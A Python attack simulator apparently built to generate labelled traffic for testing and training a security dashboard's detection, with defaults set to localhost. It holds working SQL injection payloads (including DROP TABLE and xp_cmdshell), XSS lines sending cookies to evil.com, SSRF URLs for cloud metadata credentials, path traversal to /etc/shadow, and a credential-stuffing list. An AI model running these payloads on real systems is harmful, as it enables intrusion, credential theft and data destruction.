"""
VIREX Attack Simulator - Extended Vulnerabilities Edition
==========================================================
Tests REAL vulnerabilities in the Virex Security Dashboard:
  - SQL Injection          (SQLi)      - 27 payloads, 9 targets
  - Cross-Site Scripting   (XSS)       - 24 payloads, 7 targets
  - Brute Force Login      (BruteForce)- 15 usernames x 20 passwords
  - Rate Limit Abuse       (RateLimit) - burst flooding
  - CSRF Attacks           (CSRF)      - 12 payloads, 4 targets
  - SSRF Attacks           (SSRF)      - 22 payloads, 5 targets
  - Path Traversal         (PathTraversal) - 22 payloads, 5 targets
  - Scanner / Recon        (Scanner)   - 37 sensitive paths
  - Normal / Benign        (Benign)    - 17 realistic patterns

Attacks are randomly shuffled each run to produce realistic mixed traffic.
Total simulation time is deliberately extended for richer dataset generation.
"""

import os
import csv
import json
import time
import uuid
import random
import datetime

import requests

# ──────────────────────────── EXTENDED PAYLOADS ────────────────────────────

ATTACK_PAYLOADS = {

    # ── SQL INJECTION ──────────────────────────────────────────────────────
    "sqli": {
        "description": "SQL Injection - targets /api/users, /api/orders, /api/products, /api/login",
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1--",
            "1' OR '1'='1' /*",
            "' OR 1=1#",
            "\" OR \"\"=\"",
            "') OR ('1'='1",
            "1 OR 1=1",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT pg_sleep(5)--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "'; DELETE FROM products WHERE 1=1--",
            "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
            "1; EXEC xp_cmdshell('whoami')--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "0'; EXEC('sel'+'ect 1')--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        ],
        "targets": [
            ("GET",  "/api/users",    "search"),
            ("GET",  "/api/orders",   "user"),
            ("GET",  "/api/products", "search"),
            ("GET",  "/api/products", "category"),
            ("GET",  "/api/products", "id"),
            ("POST", "/api/login",    "username"),
            ("POST", "/api/login",    "password"),
            ("GET",  "/api/users",    "id"),
            ("GET",  "/api/orders",   "status"),
        ],
    },

    # ── XSS ───────────────────────────────────────────────────────────────
    "xss": {
        "description": "Cross-Site Scripting - targets comment/message/name/search fields",
        "payloads": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<div onmouseover=alert(1)>hover</div>",
            "<a href='javascript:alert(1)'>click</a>",
            "<iframe src='javascript:alert(1)'>",
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "';alert(String.fromCharCode(88,83,83))//",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=1 onerror=alert(1)>",
            "<audio src=1 onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script><img src=x onerror=alert(1)>",
            "<object data='javascript:alert(1)'>",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
            "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
        ],
        "targets": [
            ("POST", "/api/data",     "comment"),
            ("POST", "/api/data",     "message"),
            ("POST", "/api/data",     "name"),
            ("POST", "/api/data",     "title"),
            ("GET",  "/api/search",   "q"),
            ("GET",  "/api/products", "search"),
            ("POST", "/api/users",    "bio"),
        ],
    },

    # ── BRUTE FORCE ───────────────────────────────────────────────────────
    "brute_force": {
        "description": "Brute Force / Credential Stuffing on login endpoints",
        "usernames": [
            "admin", "root", "user", "administrator", "test",
            "superuser", "guest", "operator", "support", "webmaster",
            "info", "manager", "demo", "api", "service",
        ],
        "passwords": [
            "123456", "password", "admin123", "Admin@123", "letmein",
            "123456789", "qwerty", "abc123", "111111", "pass123",
            "welcome", "monkey", "dragon", "master", "secret",
            "shadow", "sunshine", "princess", "football", "iloveyou",
        ],
    },

    # ── RATE LIMIT ABUSE ──────────────────────────────────────────────────
    "rate_limit": {
        "description": "Rate Limit Abuse - rapid-fire requests to the same endpoint",
        "targets": [
            ("GET",  "/api/health",   None),
            ("GET",  "/api/products", None),
            ("GET",  "/api/users",    None),
            ("POST", "/api/login",    {"username": "admin", "password": "test"}),
            ("GET",  "/api/orders",   None),
            ("POST", "/api/data",     {"data": "flood"}),
        ],
    },

    # ── CSRF ──────────────────────────────────────────────────────────────
    "csrf": {
        "description": "CSRF Attacks - cross-origin state-changing requests without token",
        "payloads": [
            {"action": "delete_user",     "user_id": 1},
            {"action": "delete_user",     "user_id": 42},
            {"action": "change_password", "new_password": "hacked123"},
            {"action": "change_password", "new_password": "P@$$w0rd!"},
            {"action": "transfer_funds",  "amount": 5000,  "to": "attacker"},
            {"action": "transfer_funds",  "amount": 99999, "to": "evil_account"},
            {"action": "update_email",    "email": "attacker@evil.com"},
            {"action": "update_email",    "email": "pwned@hack.net"},
            {"action": "add_admin",       "username": "backdoor"},
            {"action": "disable_2fa",     "user_id": 1},
            {"action": "export_users",    "format": "csv"},
            {"action": "reset_password",  "user_id": 5},
        ],
        "targets": [
            ("POST",   "/api/data",  None),
            ("POST",   "/api/users", None),
            ("DELETE", "/api/users", None),
            ("PUT",    "/api/users", None),
        ],
    },

    # ── SSRF ──────────────────────────────────────────────────────────────
    "ssrf": {
        "description": "Server-Side Request Forgery - tricks server into making internal requests",
        "payloads": [
            "http://localhost/admin",
            "http://127.0.0.1/admin",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:3306/",
            "http://0.0.0.0/secret",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://internal-service.local/api/secret",
            "http://192.168.1.1/admin",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/config",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:9000/_GET%20/secret%20HTTP/1.1",
            "http://0177.0.0.1/admin",
            "http://2130706433/admin",
            "http://[::1]/admin",
        ],
        "params": ["url", "callback", "redirect", "next", "dest", "uri", "path", "src"],
        "targets": [
            ("GET",  "/api/data",    None),
            ("POST", "/api/data",    None),
            ("GET",  "/api/fetch",   None),
            ("GET",  "/api/proxy",   None),
            ("POST", "/api/webhook", None),
        ],
    },

    # ── PATH TRAVERSAL ────────────────────────────────────────────────────
    "path_traversal": {
        "description": "Path Traversal / Directory Traversal - file read outside web root",
        "payloads": [
            "../../../etc/passwd",
            "../../etc/passwd",
            "./../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "/etc/passwd",
            "/etc/hosts",
            "/etc/shadow",
            "/proc/self/environ",
            "/proc/version",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "..../\\..../\\..../\\etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/..%2F..%2F..%2Fetc%2Fpasswd",
        ],
        "targets": [
            ("GET", "/api/data",     "file"),
            ("GET", "/api/data",     "path"),
            ("GET", "/api/download", "filename"),
            ("GET", "/api/static",   "resource"),
            ("GET", "/api/read",     "f"),
        ],
    },

    # ── SCANNER / RECON ───────────────────────────────────────────────────
    "scanner": {
        "description": "Scanner / Reconnaissance - probing for sensitive paths and config files",
        "paths": [
            "/.env",
            "/.env.local",
            "/.env.production",
            "/.git/config",
            "/.git/HEAD",
            "/.git/FETCH_HEAD",
            "/admin",
            "/admin/login",
            "/administrator",
            "/phpmyadmin",
            "/phpinfo.php",
            "/backup.sql",
            "/backup.zip",
            "/db/virex.db",
            "/data/users.json",
            "/api/swagger.json",
            "/api/docs",
            "/api/openapi.json",
            "/.aws/credentials",
            "/server-status",
            "/server-info",
            "/web.config",
            "/config.php",
            "/config.yml",
            "/wp-login.php",
            "/wp-admin",
            "/.DS_Store",
            "/robots.txt",
            "/sitemap.xml",
            "/crossdomain.xml",
            "/trace.axd",
            "/__debug__",
            "/_profiler",
            "/actuator/env",
            "/actuator/health",
            "/actuator/mappings",
            "/metrics",
            "/console",
        ],
    },
}

# ─────────────────────────── NORMAL TRAFFIC ────────────────────────────────

NORMAL_REQUESTS = [
    ("GET",  "/api/health",   {"detail": "true"},                           None),
    ("GET",  "/api/health",   None,                                          None),
    ("GET",  "/api/products", {"category": "electronics"},                  None),
    ("GET",  "/api/products", {"category": "clothing"},                     None),
    ("GET",  "/api/products", {"search": "laptop"},                         None),
    ("GET",  "/api/products", {"page": 1, "limit": 20},                     None),
    ("GET",  "/api/products", {"page": 2, "limit": 20},                     None),
    ("GET",  "/api/users",    {"search": "ahmed"},                          None),
    ("GET",  "/api/users",    {"search": "sara"},                           None),
    ("GET",  "/api/users",    {"page": 1},                                   None),
    ("GET",  "/api/orders",   {"status": "pending"},                        None),
    ("GET",  "/api/orders",   {"status": "shipped"},                        None),
    ("POST", "/api/data",     None, {"name": "Ahmed Ali",   "email": "ahmed@example.com", "message": "Hello"}),
    ("POST", "/api/data",     None, {"name": "Sara Hassan", "email": "sara@mail.com",     "message": "Test"}),
    ("POST", "/api/login",    None, {"username": "alice",  "password": "AlicePass!23"}),
    ("POST", "/api/data",     None, {"type": "feedback", "rating": 5, "comment": "Great!"}),
    ("POST", "/api/data",     None, {"type": "feedback", "rating": 3, "comment": "Good product"}),
]


# ─────────────────────────── SIMULATOR CLASS ───────────────────────────────

class RealAttackSimulator:
    """
    Extended attack simulator targeting real Virex Security Project endpoints.
    Supports: SQLi, XSS, BruteForce, RateLimit, CSRF, SSRF, PathTraversal,
              Scanner and Normal/Benign traffic.
    Attacks are randomly shuffled to produce realistic mixed traffic.
    """

    def __init__(self, target_url=None, dashboard_url=None):
        from dotenv import load_dotenv
        load_dotenv()

        self.dashboard_url = dashboard_url or os.getenv("DASHBOARD_URL", "http://localhost:8070")
        self.api_url       = target_url    or os.getenv("TARGET_URL",   "http://localhost:8060")
        self.session = requests.Session()

        # ── User-Agents ────────────────────────────────────────────────────
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0",
        ]
        self.scanner_agents = [
            "sqlmap/1.8.3#stable",
            "sqlmap/1.7.11#stable",
            "Nmap Scripting Engine",
            "Nikto/2.5.0",
            "nuclei/2.9.1",
            "acunetix-product",
            "Burp Suite Pro",
            "w3af.org",
            "masscan/1.3.2",
            "zgrab/0.x",
            "gobuster/3.6",
            "dirsearch/0.4.3",
            "python-requests/2.31.0",
            "curl/8.1.2",
        ]

        self.dataset_rows  = []
        self.attack_count  = 0
        self.blocked_count = 0

    # ── Helpers ────────────────────────────────────────────────────────────

    def _random_ip(self):
        return (
            f"{random.randint(11, 223)}."
            f"{random.randint(0, 255)}."
            f"{random.randint(0, 255)}."
            f"{random.randint(1, 254)}"
        )

    def _client_context(self, client_type: str = "normal"):
        agent = (
            random.choice(self.scanner_agents)
            if client_type == "scanner"
            else random.choice(self.user_agents)
        )
        ip = self._random_ip()
        return {
            "ip": ip,
            "headers": {
                "User-Agent":      agent,
                "Accept":          "application/json, text/html, */*",
                "Accept-Language": random.choice(["en-US,en;q=0.9", "ar-EG,ar;q=0.9", "fr-FR,fr;q=0.8"]),
                "X-Forwarded-For": self._random_ip(),
                "X-Real-IP":       ip,
                "X-Request-ID":    str(uuid.uuid4()),
                "Connection":      "keep-alive",
            },
        }

    def _request(self, method, url, context, params=None, json_data=None, timeout=8):
        headers = dict(context["headers"])
        headers["X-Forwarded-For"] = context["ip"]

        try:
            if method == "GET":
                resp = self.session.get(url, params=params, headers=headers, timeout=timeout)
            elif method == "POST":
                resp = self.session.post(url, json=json_data, headers=headers, timeout=timeout)
            elif method == "PUT":
                resp = self.session.put(url, json=json_data, headers=headers, timeout=timeout)
            elif method == "DELETE":
                resp = self.session.delete(url, headers=headers, timeout=timeout)
            else:
                return None

            self.attack_count += 1
            if resp.status_code in (403, 429):
                self.blocked_count += 1

            return resp

        except requests.exceptions.ConnectionError as e:
            print(f"      [ERROR] Connection refused / DNS error -> {url}: {e}")
            return None
        except requests.exceptions.Timeout:
            print(f"      [ERROR] Request timed out -> {url}")
            return None
        except Exception as e:
            print(f"      [ERROR] Unexpected error -> {url}: {e}")
            return None

    def _pause(self, lo: float = 0.3, hi: float = 1.2):
        """Randomised delay to mimic realistic inter-request timing."""
        time.sleep(random.uniform(lo, hi))

    def _long_pause(self, lo: float = 1.5, hi: float = 4.0):
        """Longer pause between attack phases."""
        delay = random.uniform(lo, hi)
        print(f"    [~] Waiting {delay:.1f}s before next phase...")
        time.sleep(delay)

    def _log(self, attack_type, payload, label, status_code, blocked=False):
        self.dataset_rows.append({
            "timestamp":       datetime.datetime.utcnow().isoformat(),
            "attack_type":     attack_type,
            "payload_snippet": str(payload)[:150],
            "label":           label,
            "status_code":     status_code if status_code is not None else "N/A",
            "blocked":         blocked,
        })

    # Keep old name for backward compat
    def _log_dataset(self, attack_type, payload, label, status_code, blocked=False):
        self._log(attack_type, payload, label, status_code, blocked)

    def _code_str(self, code):
        return str(code) if code else "ERR"


    # ── Attack Methods ─────────────────────────────────────────────────────

    def sql_injection_attacks(self, num: int = 30):
        print(f"\n  ╔══ [SQLi] Starting {num} SQL Injection attacks ══╗")
        payloads = ATTACK_PAYLOADS["sqli"]["payloads"]
        targets  = ATTACK_PAYLOADS["sqli"]["targets"]

        for i in range(num):
            method, endpoint, param = random.choice(targets)
            payload = random.choice(payloads)
            ctx     = self._client_context("attacker")
            url     = f"{self.api_url}{endpoint}"

            if method == "GET":
                r = self._request("GET", url, ctx, params={param: payload})
            else:
                r = self._request("POST", url, ctx, json_data={param: payload, "password": "testpass"})

            code    = r.status_code if r else None
            blocked = code in (403, 429) if code else False
            print(f"    [{i+1:02d}/{num}] {method:4s} {endpoint}?{param}={payload[:35]!r:40s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("sqli", payload, 1, code, blocked)
            self._pause(0.3, 1.0)

        print(f"  ╚══ [SQLi] Done ══╝")

    def xss_attacks(self, num: int = 25):
        print(f"\n  ╔══ [XSS] Starting {num} XSS attacks ══╗")
        payloads = ATTACK_PAYLOADS["xss"]["payloads"]
        targets  = ATTACK_PAYLOADS["xss"]["targets"]

        for i in range(num):
            method, endpoint, field = random.choice(targets)
            payload = random.choice(payloads)
            ctx     = self._client_context("attacker")
            url     = f"{self.api_url}{endpoint}"

            body = {field: payload, "email": f"test{random.randint(1,9999)}@test.com"}
            if method == "GET":
                r = self._request("GET", url, ctx, params={field: payload})
            else:
                r = self._request("POST", url, ctx, json_data=body)

            code    = r.status_code if r else None
            blocked = code in (403, 429) if code else False
            print(f"    [{i+1:02d}/{num}] {method:4s} {endpoint} {field}={payload[:35]!r:40s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("xss", payload, 1, code, blocked)
            self._pause(0.3, 0.9)

        print(f"  ╚══ [XSS] Done ══╝")

    def brute_force_login(self, num: int = 50):
        print(f"\n  ╔══ [BruteForce] Starting {num} credential-stuffing attempts ══╗")
        usernames = ATTACK_PAYLOADS["brute_force"]["usernames"]
        passwords = ATTACK_PAYLOADS["brute_force"]["passwords"]

        ctx = self._client_context("attacker")
        for i in range(num):
            if i % 7 == 0:
                ctx = self._client_context("attacker")   # rotate source IP

            uname  = random.choice(usernames)
            passwd = random.choice(passwords)
            r      = self._request("POST", f"{self.api_url}/api/login", ctx,
                                   json_data={"username": uname, "password": passwd})

            code    = r.status_code if r else None
            blocked = code in (403, 429) if code else False

            if i % 5 == 0 or blocked:
                print(f"    [{i+1:02d}/{num}] {uname}:{passwd} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("brute_force", f"{uname}:{passwd}", 1, code, blocked)
            self._pause(0.1, 0.5)

        print(f"  ╚══ [BruteForce] Done ══╝")

    def rate_limit_abuse(self, num: int = 60, burst: int = 15):
        """
        Simulates rate-limit abuse: sends `burst` rapid requests to the same
        endpoint, pauses briefly, then switches endpoint.
        """
        print(f"\n  ╔══ [RateLimit] Flooding {num} rapid-fire requests in bursts of {burst} ══╗")
        targets = ATTACK_PAYLOADS["rate_limit"]["targets"]
        sent    = 0

        while sent < num:
            method, endpoint, body = random.choice(targets)
            url = f"{self.api_url}{endpoint}"
            ctx = self._client_context("attacker")

            burst_size = min(burst, num - sent)
            print(f"    [~] Burst -> {method} {endpoint}  x{burst_size}")
            for j in range(burst_size):
                if method == "GET":
                    r = self._request("GET", url, ctx, timeout=4)
                else:
                    r = self._request("POST", url, ctx, json_data=body, timeout=4)

                code    = r.status_code if r else None
                blocked = code in (403, 429) if code else False
                self._log("rate_limit", f"{method} {endpoint}", 1, code, blocked)

                if j % 5 == 0:
                    print(f"      [{sent+j+1:02d}/{num}] -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
                time.sleep(random.uniform(0.02, 0.12))

            sent += burst_size
            self._pause(0.5, 2.0)

        print(f"  ╚══ [RateLimit] Done ══╝")

    def csrf_attacks(self, num: int = 20):
        print(f"\n  ╔══ [CSRF] Starting {num} CSRF attacks ══╗")
        payloads = ATTACK_PAYLOADS["csrf"]["payloads"]
        targets  = ATTACK_PAYLOADS["csrf"]["targets"]

        for i in range(num):
            method, endpoint, _ = random.choice(targets)
            payload = random.choice(payloads)
            ctx     = self._client_context("attacker")

            ctx["headers"].pop("Referer", None)
            ctx["headers"]["Origin"] = "http://evil-site.com"

            url = f"{self.api_url}{endpoint}"
            r   = self._request(method, url, ctx, json_data=payload)

            code    = r.status_code if r else None
            blocked = code in (403, 429) if code else False
            print(f"    [{i+1:02d}/{num}] {method:6s} {endpoint} action={payload.get('action','?'):25s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("csrf", json.dumps(payload)[:100], 1, code, blocked)
            self._pause(0.4, 1.2)

        print(f"  ╚══ [CSRF] Done ══╝")

    def ssrf_attacks(self, num: int = 25):
        print(f"\n  ╔══ [SSRF] Starting {num} Server-Side Request Forgery attacks ══╗")
        payloads = ATTACK_PAYLOADS["ssrf"]["payloads"]
        params   = ATTACK_PAYLOADS["ssrf"]["params"]
        targets  = ATTACK_PAYLOADS["ssrf"]["targets"]

        for i in range(num):
            method, endpoint, _ = random.choice(targets)
            payload = random.choice(payloads)
            param   = random.choice(params)
            ctx     = self._client_context("attacker")
            url     = f"{self.api_url}{endpoint}"

            if method == "GET":
                r = self._request("GET", url, ctx, params={param: payload})
            else:
                r = self._request("POST", url, ctx, json_data={param: payload})

            code    = r.status_code if r else None
            blocked = code in (403, 429) if code else False
            print(f"    [{i+1:02d}/{num}] {method:4s} {endpoint} {param}={payload[:50]!r:55s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("ssrf", payload, 1, code, blocked)
            self._pause(0.4, 1.3)

        print(f"  ╚══ [SSRF] Done ══╝")

    def path_traversal_attacks(self, num: int = 22):
        print(f"\n  ╔══ [PathTraversal] Starting {num} directory traversal attacks ══╗")
        payloads = ATTACK_PAYLOADS["path_traversal"]["payloads"]
        targets  = ATTACK_PAYLOADS["path_traversal"]["targets"]

        for i in range(num):
            payload = random.choice(payloads)
            ctx     = self._client_context("attacker")

            if random.random() < 0.5:
                method, endpoint, param = random.choice(targets)
                r = self._request("GET", f"{self.api_url}{endpoint}", ctx, params={param: payload})
                label_url = f"{endpoint}?{param}=..."
            else:
                path_clean = payload if payload.startswith("/") else f"/{payload}"
                r = self._request("GET", f"{self.api_url}{path_clean}", ctx)
                label_url = path_clean[:45]

            code    = r.status_code if r else None
            blocked = code in (403, 404, 429) if code else False
            print(f"    [{i+1:02d}/{num}] GET {label_url[:60]:62s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("path_traversal", payload, 1, code, blocked)
            self._pause(0.3, 1.1)

        print(f"  ╚══ [PathTraversal] Done ══╝")

    def scanner_simulation(self, num: int = 35):
        print(f"\n  ╔══ [Scanner] Starting {num} reconnaissance probes ══╗")
        paths = ATTACK_PAYLOADS["scanner"]["paths"]
        ctx   = self._client_context("scanner")

        for i in range(num):
            if i % 10 == 0:
                ctx = self._client_context("scanner")   # rotate scanner fingerprint

            path  = random.choice(paths)
            base  = random.choice([self.dashboard_url, self.api_url])
            path_clean = path if path.startswith("/") else f"/{path}"
            r     = self._request("GET", f"{base}{path_clean}", ctx)

            code    = r.status_code if r else None
            blocked = code in (403, 404, 429) if code else False
            print(f"    [{i+1:02d}/{num}] GET {path:45s} -> {self._code_str(code)} {'X BLOCKED' if blocked else ''}")
            self._log("recon", path, 1, code, blocked)
            self._pause(0.2, 0.8)

        print(f"  ╚══ [Scanner] Done ══╝")

    def legitimate_traffic(self, num: int = 20):
        print(f"\n  -- [Normal] Sending {num} legitimate requests --")
        for i in range(num):
            ctx = self._client_context("normal")
            method, endpoint, qparams, body = random.choice(NORMAL_REQUESTS)
            url = f"{self.api_url}{endpoint}"

            if method == "GET":
                r = self._request("GET", url, ctx, params=qparams)
            else:
                r = self._request("POST", url, ctx, json_data=body)

            code = r.status_code if r else None
            if i % 5 == 0:
                print(f"    [{i+1:02d}/{num}] {method:4s} {endpoint:30s} -> {self._code_str(code)}")
            self._log("benign", "normal_request", 0, code, False)
            self._pause(0.5, 1.8)

        print(f"  -- [Normal] Done --")

    # ── Export / Stats ─────────────────────────────────────────────────────

    def export_dataset(self, path: str = "data/real_attack_dataset.csv"):
        os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)
        fields = ["timestamp", "attack_type", "payload_snippet", "label", "status_code", "blocked"]
        with open(path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fields)
            writer.writeheader()
            writer.writerows(self.dataset_rows)
        print(f"\n  [OK] Dataset exported -> {path}  ({len(self.dataset_rows)} rows)")

    def print_stats(self):
        type_counts: dict = {}
        for row in self.dataset_rows:
            t = row["attack_type"]
            type_counts[t] = type_counts.get(t, 0) + 1

        print(f"\n{'='*65}")
        print(f"  VIREX Attack Simulator -- Session Summary")
        print(f"{'='*65}")
        print(f"  Total Requests : {self.attack_count}")
        print(f"  Total Blocked  : {self.blocked_count}")
        block_rate = (self.blocked_count / self.attack_count * 100) if self.attack_count > 0 else 0
        print(f"  Block Rate     : {block_rate:.1f}%")
        print(f"  Dataset Rows   : {len(self.dataset_rows)}")
        print(f"{'─'*65}")
        print(f"  {'Attack Type':<20} {'Requests':>10}")
        print(f"{'─'*65}")
        for t, c in sorted(type_counts.items(), key=lambda x: -x[1]):
            print(f"  {t:<20} {c:>10}")
        print(f"{'='*65}\n")

    # ── Full Simulation ────────────────────────────────────────────────────

    def run_full_test(self):
        print(f"\n{'='*65}")
        print(f"  VIREX Extended Attack Simulator")
        print(f"  Attack Types: SQLi | XSS | BruteForce | RateLimit |")
        print(f"                CSRF | SSRF | PathTraversal | Scanner | Normal")
        print(f"{'='*65}\n")

        # ── Connectivity check ────────────────────────────────────────────
        for label, base in [("API Gateway", self.api_url), ("Dashboard", self.dashboard_url)]:
            try:
                r = self.session.get(f"{base}/api/health", timeout=5)
                print(f"  [OK] {label} reachable at {base}  (HTTP {r.status_code})")
            except Exception:
                print(f"  [WARNING] Cannot reach {label} at {base}")

        # ── Build randomised attack schedule ─────────────────────────────
        attack_phases = [
            ("sqli",           lambda: self.sql_injection_attacks(random.randint(25, 35))),
            ("xss",            lambda: self.xss_attacks(random.randint(20, 28))),
            ("brute_force",    lambda: self.brute_force_login(random.randint(40, 60))),
            ("rate_limit",     lambda: self.rate_limit_abuse(num=random.randint(50, 70), burst=random.randint(12, 20))),
            ("csrf",           lambda: self.csrf_attacks(random.randint(15, 25))),
            ("ssrf",           lambda: self.ssrf_attacks(random.randint(20, 30))),
            ("path_traversal", lambda: self.path_traversal_attacks(random.randint(18, 28))),
            ("scanner",        lambda: self.scanner_simulation(random.randint(30, 40))),
        ]
        random.shuffle(attack_phases)   # randomise order every run

        print(f"\n  [~] Attack order this session:")
        for idx, (name, _) in enumerate(attack_phases, 1):
            print(f"      {idx}. {name}")

        print(f"\n{'─'*65}")
        print(f"  Starting simulation... (this will take several minutes)")
        print(f"{'─'*65}")

        for idx, (name, attack_fn) in enumerate(attack_phases, 1):
            print(f"\n  === Phase {idx}/{len(attack_phases)}: {name.upper()} ===")
            attack_fn()

            legit_count = random.randint(12, 22)
            self.legitimate_traffic(legit_count)

            if idx < len(attack_phases):
                self._long_pause(2.0, 5.0)

        # ── Final wave of normal traffic ──────────────────────────────────
        print(f"\n  === Final Phase: Normal Baseline Traffic ===")
        self.legitimate_traffic(random.randint(25, 35))

        self.export_dataset()
        self.print_stats()


# ──────────────────────────── ENTRY POINT ─────────────────────────────────

if __name__ == "__main__":
    import argparse
    from dotenv import load_dotenv
    load_dotenv()

    parser = argparse.ArgumentParser(
        description="VIREX Extended Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack types simulated:
  - SQLi         : SQL Injection (27 payloads, 9 targets)
  - XSS          : Cross-Site Scripting (24 payloads, 7 targets)
  - BruteForce   : Credential Stuffing (15 usernames x 20 passwords)
  - RateLimit    : Rapid-fire burst flooding
  - CSRF         : Cross-Site Request Forgery (12 payloads, 4 targets)
  - SSRF         : Server-Side Request Forgery (22 payloads, 5 targets)
  - PathTraversal: Directory Traversal (22 payloads, 5 targets)
  - Scanner      : Reconnaissance probing (37 sensitive paths)
  - Normal       : Legitimate baseline traffic (17 patterns)
        """,
    )
    parser.add_argument(
        "--dashboard",
        default=os.getenv("DASHBOARD_URL", "http://localhost:8070"),
        help="Dashboard URL (default: http://localhost:8070)",
    )
    parser.add_argument(
        "--target",
        default=os.getenv("TARGET_URL", "http://localhost:8060"),
        help="Target API Gateway URL / Nginx (default: http://localhost:8060)",
    )
    parser.add_argument(
        "--export",
        default="data/real_attack_dataset.csv",
        help="CSV export path (default: data/real_attack_dataset.csv)",
    )
    args = parser.parse_args()

    sim = RealAttackSimulator(target_url=args.target, dashboard_url=args.dashboard)
    sim.run_full_test()
